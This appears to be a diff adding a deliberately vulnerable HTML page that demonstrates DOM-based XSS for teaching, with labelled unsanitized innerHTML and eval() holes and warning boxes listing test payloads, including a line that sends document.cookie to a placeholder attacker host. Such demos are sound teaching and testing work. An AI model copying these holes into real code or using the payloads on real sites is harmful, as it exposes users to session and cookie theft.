@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DOM XSS Demo (VULNERABLE)</title>
+    <style>
+        body { font-family: Arial; background: #f5f5f5; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        h1 { color: #d32f2f; }
+        .warning { background: #ffebee; border: 1px solid #d32f2f; padding: 15px; border-radius: 5px; margin-bottom: 20px; color: #c62828; }
+        .section { margin: 20px 0; padding: 15px; background: #f9f9f9; border-radius: 5px; }
+        .profile { background: #e3f2fd; padding: 15px; border-radius: 5px; border-left: 4px solid #2196F3; }
+        code { background: #f5f5f5; padding: 2px 5px; border-radius: 3px; }
+        .payload { background: #fff3cd; padding: 10px; border-radius: 3px; margin: 10px 0; word-break: break-all; font-family: monospace; font-size: 12px; }
+        input { padding: 8px; width: 100%; box-sizing: border-box; }
+        button { background: #2e765e; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ DOM-based XSS Vulnerability Demo</h1>
+        
+        <div class="warning">
+            <strong>⚠️ SECURITY WARNING:</strong> This page demonstrates DOM XSS vulnerabilities<br>
+            • innerHTML used with unsanitized data<br>
+            • No input validation or sanitization<br>
+            • Query parameters directly rendered on page<br>
+            • FOR EDUCATIONAL PURPOSES ONLY - DO NOT REPLICATE IN PRODUCTION
+        </div>
+        
+        <!-- Demo 1: Profile Display (DOM XSS via innerHTML) -->
+        <div class="section">
+            <h2>Demo 1: Profile Display (innerHTML DOM XSS)</h2>
+            <p>This loads user profile from URL parameters and renders with innerHTML (vulnerable)</p>
+            
+            <div id="profileContainer">
+                <p>Profile will load here...</p>
+            </div>
+            
+            <div class="warning">
+                <strong>Test Payload 1:</strong><br>
+                Add this to the URL:<br>
+                <code>?username=&lt;img src=x onerror="alert('DOM XSS')"&gt;&bio=Hacked</code><br><br>
+                
+                <strong>Test Payload 2:</strong><br>
+                <code>?username=&lt;svg/onload=alert('XSS')&gt;&bio=Test</code>
+            </div>
+        </div>
+        
+        <!-- Demo 2: Comment System (innerHTML DOM XSS) -->
+        <div class="section">
+            <h2>Demo 2: Comment System</h2>
+            <p>Enter a comment (will be rendered with innerHTML):</p>
+            
+            <input type="text" id="commentInput" placeholder="Enter comment...">
+            <button onclick="addComment()">Add Comment</button>
+            
+            <div id="commentsSection" style="margin-top: 10px;"></div>
+            
+            <div class="warning">
+                <strong>Test Payloads:</strong><br>
+                • <code>&lt;img src=x onerror="alert('XSS')"&gt;</code><br>
+                • <code>&lt;svg/onload=alert('XSS')&gt;</code><br>
+                • <code>"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+            </div>
+        </div>
+        
+        <!-- Demo 3: Expression Evaluator (eval() vulnerability) -->
+        <div class="section">
+            <h2>Demo 3: Expression Evaluator (EXTREMELY DANGEROUS)</h2>
+            <p>Enter a JavaScript expression (will be evaluated with eval()):</p>
+            
+            <input type="text" id="expressionInput" placeholder="Try: 2+2 or alert('XSS')">
+            <button onclick="evaluateUserExpression()">Evaluate</button>
+            
+            <div id="expressionResult" style="margin-top: 10px; background: #fff3cd; padding: 10px; display: none;"></div>
+            
+            <div class="warning">
+                <strong>Test Payloads:</strong><br>
+                • <code>alert('Code Execution via eval()')</code><br>
+                • <code>fetch('http://attacker.com?cookie='+document.cookie)</code><br>
+                • <code>document.location='http://attacker.com'</code>
+            </div>
+        </div>
+        
+        <!-- Demo 4: User Data Display -->
+        <div class="section">
+            <h2>Demo 4: User Data (Query Parameter Reflection)</h2>
+            <div id="userDataDisplay"></div>
+            
+            <div class="warning">
+                <strong>Test with these URLs:</strong><br>
+                • <code>?name=&lt;img src=x onerror="alert('XSS')"&gt;</code><br>
+                • <code>?bio=&lt;script&gt;alert('Stored in innerHTML')&lt;/script&gt;</code>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Script that uses vulnerable functions -->
+    <script>
+        // VULNERABILITY: addComment uses innerHTML with unsanitized input
+        function addComment() {
+            const input = document.getElementById('commentInput');
+            const comment = input.value;
+            
+            if (comment.trim() === '') return;
+            
+            const commentDiv = document.createElement('div');
+            commentDiv.style.cssText = 'background: #e8f5e9; padding: 10px; margin: 10px 0; border-radius: 3px;';
+            
+            // VULNERABLE: innerHTML with unsanitized user input
+            commentDiv.innerHTML = '<strong>Comment:</strong> ' + comment;
+            
+            document.getElementById('commentsSection').appendChild(commentDiv);
+            input.value = '';
+        }
+        
+        // VULNERABILITY: eval() with user input
+        function evaluateUserExpression() {
+            const input = document.getElementById('expressionInput').value;
+            const resultDiv = document.getElementById('expressionResult');
+            
+            if (input.trim() === '') return;
+            
+            try {
+                // CRITICALLY DANGEROUS: eval() with unsanitized user input
+                const result = eval(input);
+                resultDiv.innerHTML = '<strong>Result:</strong> ' + result;
+                resultDiv.style.display = 'block';
+            } catch (e) {
+                resultDiv.innerHTML = '<strong>Error:</strong> ' + e.message;
+                resultDiv.style.display = 'block';
+            }
+        }
+        
+        // VULNERABILITY: innerHTML with query parameters
+        function displayUserData() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const name = urlParams.get('name') || 'Guest';
+            const bio = urlParams.get('bio') || 'No bio';
+            
+            // VULNERABLE: innerHTML with unsanitized URL parameters
+            document.getElementById('userDataDisplay').innerHTML = `
+                <div class="profile">
+                    <h3>User Profile</h3>
+                    <p><strong>Name:</strong> ${name}</p>
+                    <p><strong>Bio:</strong> ${bio}</p>
+                </div>
+            `;
+        }
+        
+        // Run on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            // Update profile from URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const username = urlParams.get('username') || 'User';
+            const bio = urlParams.get('bio') || 'No bio set';
+            
+            if (document.getElementById('profileContainer')) {
+                document.getElementById('profileContainer').innerHTML = `
+                    <div class="profile">
+                        <h3>Welcome, ${username}!</h3>
+                        <p>${bio}</p>
+                    </div>
+                `;
+            }
+            
+            displayUserData();
+        });
+    </script>
+</body>
+</html>
